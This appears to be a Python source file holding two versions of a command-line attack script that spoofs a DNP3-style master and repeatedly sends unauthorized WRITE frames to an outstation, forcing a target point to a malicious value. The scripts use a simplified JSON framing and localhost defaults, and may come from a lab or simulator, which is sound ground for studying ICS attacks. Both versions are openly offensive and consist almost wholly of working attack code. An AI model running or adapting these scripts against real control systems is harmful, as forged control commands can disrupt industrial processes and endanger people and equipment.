import argparse
import json
import logging
import socket
import time
from typing import Any, Dict


LOG_FORMAT = "%(asctime)s [MASTER_SPOOF] %(levelname)s: %(message)s"
logging.basicConfig(level=logging.INFO, format=LOG_FORMAT)
logger = logging.getLogger("dnp3_master_spoof")


# Gửi một frame JSON đơn lẻ qua socket tới outstation (thêm ký tự xuống dòng để phân tách frame).
def send_frame(sock: socket.socket, frame: Dict[str, Any]) -> None:
    raw = json.dumps(frame).encode("utf-8") + b"\n"
    sock.sendall(raw)


 # Tạo frame WRITE đơn giản với seq, point_id, value và timestamp để giả lập lệnh điều khiển master.
def build_write_frame(seq: int, point_id: int, value: Any) -> Dict[str, Any]:
    return {
        "type": "WRITE",
        "point_id": point_id,
        "value": value,
        "seq": seq,
        "timestamp": time.time(),
    }


 # Hàm chạy master giả: liên tục kết nối trực tiếp tới outstation và gửi các frame WRITE trái phép tới point mục tiêu.
def run_master_spoof(
    host: str,
    port: int,
    point_id: int,
    value: int,
    interval: float,
    iterations: int,
) -> None:
    """
    Connect directly to the outstation and continuously send WRITE commands
    pretending to be a legitimate master.
    """
    logger.info(
        "Starting spoofed master to %s:%d targeting point_id=%d value=%d",
        host,
        port,
        point_id,
        value,
    )
    seq = 0

    for i in range(iterations if iterations > 0 else 1_000_000_000):
        try:
            with socket.create_connection((host, port), timeout=5.0) as sock:
                seq += 1
                frame = build_write_frame(seq=seq, point_id=point_id, value=value)
                logger.warning(
                    "[SPOOFED_MASTER->OUTSTATION] WRITE seq=%s point_id=%s value=%s (iteration %d)",
                    frame["seq"],
                    frame["point_id"],
                    frame["value"],
                    i + 1,
                )
                send_frame(sock, frame)
                # Optionally read a response, but we don't strictly need it
                sock.settimeout(2.0)
                try:
                    data = sock.recv(4096)
                    if data:
                        for line in data.split(b"\n"):
                            if not line.strip():
                                continue
                            logger.info("[OUTSTATION->SPOOFED_MASTER] %s", line.decode("utf-8"))
                except socket.timeout:
                    logger.debug("No response received (timeout), continuing")
        except (ConnectionRefusedError, TimeoutError, OSError) as exc:
            logger.error("Failed to connect to outstation: %s", exc)
            time.sleep(2.0)

        if interval > 0:
            time.sleep(interval)


 # Hàm main (phiên bản 1) đọc tham số CLI và khởi động vòng lặp run_master_spoof.
def main() -> None:
    parser = argparse.ArgumentParser(
        description="DNP3-style spoofed master sending unauthorized WRITE commands directly to the outstation.",
    )
    parser.add_argument("--host", default="127.0.0.1", help="Target outstation host.")
    parser.add_argument("--port", type=int, default=20000, help="Target outstation port.")
    parser.add_argument(
        "--point-id",
        type=int,
        default=1,
        help="Point ID to overwrite on the outstation.",
    )
    parser.add_argument(
        "--value",
        type=int,
        default=999,
        help="Value to force on the chosen point.",
    )
    parser.add_argument(
        "--interval",
        type=float,
        default=1.0,
        help="Interval between spoofed commands (seconds, 0 = as fast as possible).",
    )
    parser.add_argument(
        "--iterations",
        type=int,
        default=0,
        help="Number of spoofed commands to send (0 = very large / until Ctrl+C).",
    )
    args = parser.parse_args()

    try:
        run_master_spoof(
            host=args.host,
            port=args.port,
            point_id=args.point_id,
            value=args.value,
            interval=args.interval,
            iterations=args.iterations,
        )
    except KeyboardInterrupt:
        logger.info("Stopping spoofed master (KeyboardInterrupt).")


if __name__ == "__main__":
    main()

import argparse
import json
import logging
import socket
import time
from typing import Any, Dict


LOG_FORMAT = "%(asctime)s [%(levelname)s] [DNP3MasterSpoof] %(message)s"
logging.basicConfig(level=logging.INFO, format=LOG_FORMAT)
logger = logging.getLogger(__name__)


# Gửi một frame JSON từ proxy/master giả xuống outstation, định dạng theo từng dòng.
def send_frame(sock: socket.socket, frame: Dict[str, Any]) -> None:
    raw = json.dumps(frame).encode("utf-8") + b"\n"
    sock.sendall(raw)


 # Hàm master giả duy trì kết nối lâu dài và định kỳ gửi các lệnh WRITE với giá trị độc hại tới point mục tiêu.
def spoof_master(
    host: str,
    port: int,
    interval: float,
    target_point: int,
    value: int,
) -> None:
    logger.info(
        "Starting spoofed master against %s:%d (point_id=%d, value=%d, interval=%.2fs)",
        host,
        port,
        target_point,
        value,
        interval,
    )
    seq = 1000
    while True:
        try:
            with socket.create_connection((host, port), timeout=5.0) as sock:
                logger.info("Connected to outstation as spoofed master")
                while True:
                    frame = {
                        "type": "WRITE",
                        "point_id": target_point,
                        "value": value,
                        "seq": seq,
                        "timestamp": time.time(),
                    }
                    seq += 1
                    logger.warning(
                        "[SPOOFED_MASTER->OUTSTATION] WRITE seq=%s point_id=%s value=%s",
                        frame["seq"],
                        frame["point_id"],
                        frame["value"],
                    )
                    send_frame(sock, frame)
                    time.sleep(interval)
        except (ConnectionRefusedError, TimeoutError, OSError) as exc:
            logger.warning("Connection failed: %s; retrying in 2s", exc)
            time.sleep(2.0)
        except KeyboardInterrupt:
            logger.info("Stopping spoofed master (KeyboardInterrupt).")
            break


 # Hàm main (phiên bản 2) parse tham số CLI và chạy spoof_master liên tục cho tới khi người dùng dừng lại.
def main() -> None:
    parser = argparse.ArgumentParser(
        description="DNP3 master spoofing attacker (sends malicious WRITE frames).",
    )
    parser.add_argument("--host", default="127.0.0.1", help="Target outstation host.")
    parser.add_argument("--port", type=int, default=20000, help="Target outstation port.")
    parser.add_argument(
        "--point-id",
        type=int,
        default=2,
        help="Target point id to overwrite.",
    )
    parser.add_argument(
        "--value",
        type=int,
        default=999,
        help="Malicious value to write repeatedly.",
    )
    parser.add_argument(
        "--interval",
        type=float,
        default=1.0,
        help="Seconds between malicious writes.",
    )
    args = parser.parse_args()

    spoof_master(
        host=args.host,
        port=args.port,
        interval=args.interval,
        target_point=args.point_id,
        value=args.value,
    )


if __name__ == "__main__":
    main()

